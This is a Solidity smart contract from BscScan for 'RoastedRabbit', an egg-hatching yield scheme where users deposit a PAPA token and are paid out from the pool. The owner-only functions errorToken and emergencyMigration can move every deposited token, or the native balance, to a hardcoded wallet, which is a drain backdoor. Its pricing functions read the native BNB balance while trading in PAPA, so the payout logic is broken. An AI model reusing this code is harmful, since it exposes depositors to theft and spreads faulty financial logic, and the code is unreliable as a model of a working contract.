/**
 *Submitted for verification at BscScan.com on 2023-09-10
*/

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
pragma solidity ^0.4.26; // solhint-disable-line
contract RoastedRabbit {
    //uint256 EGGS_PER_MINERS_PER_SECOND=1;
    uint256 public EGGS_TO_HATCH_1MINERS=1728000;//for final version should be seconds in a day
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized=false;
    address private marketingWalletAddress = 0x8A0a5f75CFed5e21A3Bc1a82aF812Cd265B88333;
    address public ceoAddress;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    uint256 public marketEggs;
    IERC20 public papaToken; 
    event EggsSold(address indexed seller, uint256 amount);
    event EggsBought(address indexed buyer, uint256 amount);
    constructor() public{
        ceoAddress = msg.sender;
        papaToken = IERC20(0x4BD46424B82194A2887516eCFeB1599A9531da0D);
    }
        function hatchEggs(address ref) public{
        require(initialized);
        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }
        uint256 eggsUsed=getMyEggs();
        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;

        //send referral eggs
        claimedEggs[referrals[msg.sender]]=SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(SafeMath.mul(eggsUsed,15),100));

        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }
function buyEggs(address ref, uint256 papaAmount) public {
    require(initialized);
    require(papaToken.balanceOf(msg.sender) >= papaAmount, "Insufficient PAPA tokens");

    uint256 eggsBought = calculateEggBuySimple(papaAmount);  // 使用PAPA计算购买的鸡蛋数量

    // 执行PAPA代币的转移
    require(papaToken.transferFrom(msg.sender, address(this), papaAmount), "PAPA transfer failed");

    claimedEggs[msg.sender] = SafeMath.add(claimedEggs[msg.sender], eggsBought);
    hatchEggs(ref);
}

    function sellEggs() public{
        require(initialized, "Contract not initialized");
        
        uint256 hasEggs = getMyEggs();
        require(hasEggs > 0, "No eggs to sell");
        
        uint256 papaValue = calculateEggSell(hasEggs);
        require(papaValue > 0, "Egg value is zero");

        uint256 contractBalance = papaToken.balanceOf(address(this));
        require(contractBalance >= papaValue, "Insufficient contract balance");

        uint256 fee = devFee(papaValue);
        
        claimedEggs[msg.sender] = 0;
        lastHatch[msg.sender] = now;
        marketEggs = SafeMath.add(marketEggs, hasEggs);

        require(papaToken.transfer(msg.sender, SafeMath.sub(papaValue, fee)), "PAPA transfer failed");
        require(papaToken.transfer(ceoAddress, fee), "PAPA transfer failed for dev fee");

        emit EggsSold(msg.sender, hasEggs);
    }

    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs,marketEggs,address(this).balance);
    }
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketEggs);
    }
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,address(this).balance);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,3),100);
    }
function seedMarket(uint256 papaAmount) public {
    require(msg.sender == ceoAddress, 'invalid call');
    require(marketEggs == 0);
    require(papaToken.balanceOf(msg.sender) >= papaAmount, "Insufficient PAPA tokens for seeding");

    // Transfer PAPA tokens to the contract
    require(papaToken.transferFrom(msg.sender, address(this), papaAmount), "PAPA transfer for seeding failed");

    initialized = true;
    marketEggs = 172800000000;

    // Not sure if you want to call buyEggs here, but I'll leave it in. 
    // Note: You can adjust or remove it as per your needs.
    buyEggs(msg.sender, papaAmount);
}

    function emergencyMigration(address to) external {
        require(msg.sender == ceoAddress, 'invalid call');
        to.transfer(address(this).balance);
    }

    function errorToken(address _token) external {
        require(msg.sender == ceoAddress, 'invalid call');
      IERC20(_token).transfer(marketingWalletAddress, IERC20(_token).balanceOf(address(this)));
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    function getMyEggs() public view returns(uint256){
        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));
    }
    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}